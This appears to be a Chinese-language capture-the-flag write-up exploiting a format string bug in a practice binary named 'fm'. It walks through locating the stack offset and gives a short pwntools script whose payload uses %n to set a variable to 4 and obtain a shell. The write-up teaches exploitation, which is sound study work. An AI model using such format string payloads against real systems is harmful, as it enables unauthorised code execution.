首先检查安全机制

![image-20201201170232547](https://static.hack1s.fun/images/2021/02/06/image-20201201170232547.png)

用IDA打开

![image-20201201170344974](https://static.hack1s.fun/images/2021/02/06/image-20201201170344974.png)

main函数部分其实并不存在溢出

看这个题目的名字，也知道是个格式化字符串，任务就是通过这个printf，把x赋值从3变成4

这样就可以调起来shell

首先执行输入`%08x`这样的形式查看栈上的值

可以看到输出的几个值分别是`printf(buf)`中`buf`的地址、`read`从右到左的参数

![image-20201201200228420](https://static.hack1s.fun/images/2021/02/06/image-20201201200228420.png)

通过`%p`确定了字符串本身的相对偏移

格式化字符串本身的偏移是11，想要写入的值是4，所以%n的位置应该在四个a后面

之后`aaaa`是第11个参数，`%14$`是第十二个参数，`naaa`是第十三个参数；

最后加上的x地址是第14个参数，因此这里`%k$n`的k填写的是14

```python
from pwn import *

io = process('./fm')
elf = ELF('./fm')

payload='aaaa%14$naaa'+p32(x)
io.send(payload)

io.interactive()
```

